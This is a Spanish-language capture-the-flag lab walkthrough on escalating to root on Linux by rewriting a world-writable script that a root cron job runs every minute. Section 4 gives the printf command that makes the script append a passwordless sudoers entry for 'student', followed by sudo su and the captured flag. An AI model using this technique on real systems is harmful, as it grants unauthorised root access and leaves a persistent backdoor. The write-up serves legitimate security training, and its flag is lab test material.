# ⏰ Linux: Escalada de Privilegios mediante Tareas Cron (Cron Jobs Gone Wild II)

## 🎯 Objetivo

Identificar una tarea programada (cron) mal configurada en un sistema Linux que ejecuta un script escribible por un usuario sin privilegios. Modificar dicho script para que añada una entrada en `/etc/sudoers` que permita al usuario `student` ejecutar cualquier comando como `root` sin contraseña. Escalar a superusuario y capturar la bandera.

---

## 🔍 1. Enumeración inicial

### 📡 Verificar la conectividad

```bash
ping -c4 target.ine.local
```

**Salida esperada:**
```
64 bytes from target.ine.local: icmp_seq=1 ttl=64 time=0.350 ms
...
```
El objetivo responde.

### 🌐 Acceder al servicio expuesto

Abrir un navegador y visitar la URL:

```
http://target.ine.local:8000
```

Se muestra una interfaz de terminal Linux basada en web, que ejecuta los comandos como el usuario **student**. Este será el entorno de trabajo.

---

## 🧪 2. Análisis del comportamiento sospechoso

### 📂 Revisar el directorio personal del usuario

```bash
ls -l
```

Se observa un archivo llamado `message`:

```
-rw-r--r-- 1 root root 0 Jan 01 12:00 message
```

El archivo pertenece a **root** y el usuario `student` no puede leerlo ni modificarlo.

### 🔎 Buscar si existe otro archivo con el mismo nombre en el sistema

```bash
find / -name message 2>/dev/null
```

**Salida esperada:**
```
/home/student/message
/tmp/message
```

El archivo `/tmp/message` es una copia exacta que aparece y se sobrescribe periódicamente.

### ⏱️ Comprobar la periodicidad

```bash
ls -l /tmp/message
```

Se observa que la fecha de modificación cambia cada **minuto**. Esto sugiere la existencia de una tarea cron que copia el archivo desde el directorio del estudiante hacia `/tmp`.

---

## 🔍 3. Localización del script de la tarea cron

Se busca un script o binario que contenga la cadena `/tmp/message` en el sistema.

```bash
grep -nri "/tmp/message" /usr 2>/dev/null
```

| Opción | Descripción |
|--------|-------------|
| `-n`   | Muestra el número de línea |
| `-r`   | Busca recursivamente en subdirectorios |
| `-i`   | Ignora mayúsculas/minúsculas |

**Resultado esperado:**
```
/usr/local/share/copy.sh:3:cp /home/student/message /tmp/message
```

Se encuentra el script **`/usr/local/share/copy.sh`**, responsable de la copia.

### 🔐 Verificar los permisos del script

```bash
ls -l /usr/local/share/copy.sh
```

**Salida esperada:**
```
-rwxrwxrwx 1 root root 50 Jan 01 12:00 /usr/local/share/copy.sh
```

El script es **escribible por todos los usuarios** (permisos `777`), incluido `student`. Dado que es ejecutado por una tarea cron que corre con privilegios de **root**, cualquier modificación se ejecutará con los máximos privilegios.

### 📄 Contenido original del script

```bash
cat /usr/local/share/copy.sh
```

```
#!/bin/bash
cp /home/student/message /tmp/message
```

---

## 🛠️ 4. Modificación del script para escalar privilegios

Como el sistema carece de editores de texto (`vim`, `vi`, `nano` no están disponibles), se utiliza **`printf`** para reescribir el contenido del archivo.

```bash
printf '#! /bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh
```

| Elemento | Significado |
|----------|-------------|
| `#! /bin/bash` | Shebang para el intérprete |
| `\n`       | Salto de línea |
| `echo "student ALL=NOPASSWD:ALL" >> /etc/sudoers` | Añade al usuario `student` a la lista de sudoers sin contraseña |

Después de la escritura, se verifica el nuevo contenido:

```bash
cat /usr/local/share/copy.sh
```

**Salida esperada:**
```
#!/bin/bash
echo "student ALL=NOPASSWD:ALL" >> /etc/sudoers
```

---

## ⏳ 5. Esperar la ejecución del cron

La tarea cron se ejecuta **cada minuto**. Se debe esperar ese lapso para que el script modificado sea lanzado por root y añada la entrada en `/etc/sudoers`.

### 🔍 Verificar la configuración de sudo antes de la modificación

```bash
sudo -l
```

**Respuesta típica antes de la escalada:**
```
Sorry, user student may not run sudo on target.
```

### 🔁 Tras un minuto, comprobar de nuevo

```bash
sudo -l
```

**Respuesta después de la escalada:**
```
User student may run the following commands on target:
    (ALL) NOPASSWD: ALL
```

✅ El usuario `student` ahora puede ejecutar cualquier comando como `root` sin proporcionar contraseña.

---

## 🚀 6. Escalar a root y capturar la bandera

```bash
sudo su
```

**Salida:**
```
root@target:/home/student#
```

El prompt cambia a `root`. Ahora se navega al directorio `/root` y se lee la bandera.

```bash
cd /root
ls -l
```

**Salida esperada:**
```
total 4
-rw-r--r-- 1 root root 32 Jan 01 12:00 flag
```

```bash
cat flag
```

**Bandera obtenida:**  
`697914df7a07bb9b718c8ed258150164`

---

## 🧠 Resumen del ataque

| Fase | Comando / Técnica | Propósito |
|------|-------------------|-----------|
| Enumeración | `find / -name message` | Detectar la copia automática del archivo |
| Búsqueda | `grep -nri "/tmp/message" /usr` | Localizar el script de la tarea cron |
| Evaluación de permisos | `ls -l /usr/local/share/copy.sh` | Confirmar que es escribible por cualquier usuario |
| Explotación | `printf ... > /usr/local/share/copy.sh` | Reescribir el script para añadir privilegios sudo |
| Paciencia | Esperar 1 minuto | Permitir que cron ejecute el script modificado |
| Escalada | `sudo su` | Convertirse en root |
| Captura | `cat /root/flag` | Leer la bandera |

Las tareas cron que ejecutan scripts con permisos de escritura excesivos representan un vector clásico de escalada de privilegios en Linux. La falta de editores de texto se puede suplir con comandos como `echo`, `printf` o redirecciones simples.

